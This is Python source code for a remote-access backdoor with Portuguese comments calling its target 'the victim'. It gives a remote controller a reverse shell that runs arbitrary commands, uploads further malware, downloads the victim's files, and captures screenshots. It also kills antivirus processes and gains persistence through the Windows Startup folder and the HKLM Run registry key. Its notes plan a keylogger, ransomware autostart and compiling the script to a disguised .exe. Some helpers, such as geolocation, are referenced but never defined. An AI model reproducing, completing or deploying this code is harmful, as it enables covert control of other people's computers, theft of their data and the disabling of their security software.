#!/bin/bash/env python
# coding=UTF-8
# by Tarcisio marinho
# github.com/tarcisio-marinho


import socket
import os
import time
import subprocess
import tempfile
import random
import threading
if(os.name == 'posix'): # try import propely screenshot module
    try:
        import pyscreenshot
    except ImportError:
        pass
elif(os.name == 'nt'):
    try:
        import ImageGrab
    except ImportError:
        pass


nome_arquivo='backdoor.exe' # name of file after compiled
TEMPDIR = tempfile.gettempdir() # diretório temporario do windows, onde será salvo o backdoor

''' COMPILAR O BACKDOOR
 pyinstaller -F --clean -w backdoor.py -i icone.png -n backdoor.png.exe

 testar ->
--uac-admin           Using this option creates a Manifest which will
                        request elevation upon application restart.
  --uac-uiaccess        Using this option allows an elevated application to
                        work with Remote Desktop.


 Keylogger.
 Geographic Location.
 Change victim's computer background.
 Backdoor complete (Only when all features ready).

 DOWNLOAD ALL FILES IN ONE FOLDER


 UNIX PERSISTENCE :
        https://askubuntu.com/questions/48321/how-do-i-start-applications-automatically-on-login
    copiar ransomware para -> TEMPDIR
    file -> ransomware.desktop

    UBUNTU
    [Desktop Entry]
    Type=Application
    Name=<Name of application as displayed>
    Exec=<command to execute>
    Icon=<full path to icon>
    Comment=<optinal comments>
    X-GNOME-Autostart-enabled=true

    GNOME gnome-session-properties

    criar um sh -> gnome-terminal  -e  "/batch-path/batch-name.sh"
'''

# funcão que vai ser executada por uma thread
def run(comando):
    comando = subprocess.Popen(comando, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

# método que executa um programa em uma nova thread
def run_program(s , nome_programa):
    if(os.path.isfile(nome_programa)):
        sistema = os.name
        if(sistema == 'nt'):
            execute = 'start'
            if('.exe' in nome_programa): # apenas executa o programa
                comando = nome_programa
            else:
                comando = execute + ' ' + nome_programa

        elif(sistema == 'posix'):
            execute = './'
            comando = execute + nome_programa

        if('.py' in nome_programa):
            execute = 'python '
            comando = execute + nome_programa

        t = threading.Thread(target=run, args = (comando,), name='run')
        t.start()
        s.send('0')
    else: # arquivo não existe
        s.send('1')

# metodo que tira screenshot do PC da vitma
def screenshot(s):
    nome = TEMPDIR + '/screenshot'+str(random.randint(0,1000000)) + '.png'
    if(os.name == 'posix'): # se for unix-like
        img = pyscreenshot.grab()
        img.save(nome)
    elif(os.name == 'nt'): # se for windows
        img = ImageGrab.grab()
        img.save(nome)

    # envia para o servidor
    f = open(nome ,'rb')
    l = f.read(1024)
    l = nome + '+/-' + l
    while(l):
        s.send(l)
        l = f.read(1024)
    f.close()
    print('enviado')
    s.shutdown(socket.SHUT_WR)
    os.remove(nome)

# recebe arquivos do servidor e salva no PC da vitma
def upload(s):
    l = s.recv(1024)
    nome_arquivo = l.split('+/-')[0]
    print(nome_arquivo)
    f = open(nome_arquivo,'wb')
    l = l.split('+/-')[1]
    j = s.recv(1024)
    l = l + j
    while (l):
        f.write(l)
        l = s.recv(1024)
    f.close()

 # shell reversa
def shell(s):
    while True:
        dados = s.recv(1024)
        if(not dados or dados=='exit'):
            break
        if(dados == 'shell'):
            pass
        else:
            if(dados.split(' ')[0] == 'cd'): # trocar de diretorio
                try:
                    pasta = (dados.split(' ')[1])
                    if(os.path.isdir(pasta)):
                        caminho = os.chdir(pasta.rstrip('\n'))
                        local = os.getcwd()
                        s.send(local)
                    else:
                        s.send('caminho não existe\n'+ os.getcwd())
                except Exception as e:
                    s.send('Error -> '+ e)
            else: # executa o comando
                comando = subprocess.Popen(dados, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)    # CRIAR THREADS PARA RODAR PROGRAMAS -> NÃO TER QUE ESPERAR O PROGRAMA FECHAR
                retorno = comando.stdout.read() + comando.stderr.read()
                if(retorno == ''):
                    s.send('feito')
                else:
                    s.send(retorno)
# servidor baixa um arquivo do PC da vitma
def download(s):
    arquivo = s.recv(1024)
    print(arquivo)
    if(os.path.isfile(arquivo)):
        f = open(arquivo, 'rb')
        l = f.read(1024)
        l = 'True+/-' + l
        while(l):
            s.send(l)
            l = f.read(1024)
        f.close()
        print('envio completo')
        s.shutdown(s.SHUT_WR)

    else:
        s.send('False')

# finaliza o processo do antivirus rodando na maquina
def kill_antivirus():
    with open('av.txt') as f:
        avs = f.read()
        avs = avs.split('\n')
    processes=get_output('TASKLIST /FI "STATUS eq RUNNING"')
    ps = []
    for i in processes.split(' '):
        if (".exe" in i):
            ps.append(i.replace('K\n','').replace('\n',''))
    for av in avs:
        for p in ps:
            if(p == av):
                subprocess.Popen( "TASKKILL /F /IM \"{}\" >> NUL".format(p) ,shell=True)

# persistencia -> mesmo depois de reiniciar o virus continua rodando
def persistencia(sistema):
    if(sistema == 'nt'):
        usuario = os.path.expanduser('~')
        diretorio = '\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
        caminho = usuario + diretorio
        if(os.path.isdir(caminho)): # copia o backdoor para diretorio startup
            subprocess.Popen('copy ' + nome_arquivo + ' ' + caminho, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)    # CRIAR THREADS PARA RODAR PROGRAMAS -> NÃO TER QUE ESPERAR O PROGRAMA FECHAR

        if(not os.getcwd() == TEMPDIR): # salva backdoor no registro
            subprocess.Popen('copy ' + nome_arquivo + ' ' + TEMPDIR, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)    # CRIAR THREADS PARA RODAR PROGRAMAS -> NÃO TER QUE ESPERAR O PROGRAMA FECHAR
            FNULL = open(os.devnull,'w')
            subprocess.Popen("REG ADD HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ /v backdoor /d " + TEMPDIR + "\\" + nome_arquivo, stdout=FNULL, stderr=FNULL)

    elif(sistema == 'posix'):
        pass

def conecta(IP, PORT):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((IP, PORT))
        s.send('[+] Conectado :)')
        return s
    except socket.error as erro:
        return None

def executa(socket):
    while True:
        try:
            dados = socket.recv(1)
            if(not dados): # servidor desconectou, recomeça
                return
            else:
                try:
                    if(dados=='1'): # servidor envia arquivos para a vitma -> envio de novos virus
                        upload(socket)
                    elif(dados=='2'): # shell reversa -> servidor se conecta a maquina do infectado
                        shell(socket)
                    elif(dados=='3'): # Download
                        download(socket)
                    elif(dados == '4'): # Killav
                        kill_antivirus()
                    elif(dados == '5'): # screenshot
                        screenshot(socket)
                    elif(dados == '6'):
                        programa = socket.recv(1024)
                        print(programa)
                        run_program(socket, programa)
                    elif(dados == '7'):
                        geolocation(socket)
                    else:
                        print(dados)

                except:
                    return
        except: # algum erro ocorreu, recomeça
            return

def main():
    ip='127.0.0.1'
    porta=1025
    while True:
        conexao = conecta(ip, porta)
        if(conexao):
            executa(conexao)
        else:
            time.sleep(5)

if __name__=='__main__':
    if(os.name == 'nt'):
        persistencia('nt')
    elif(os.name == 'posix'):
        persistencia('posix')
    main()
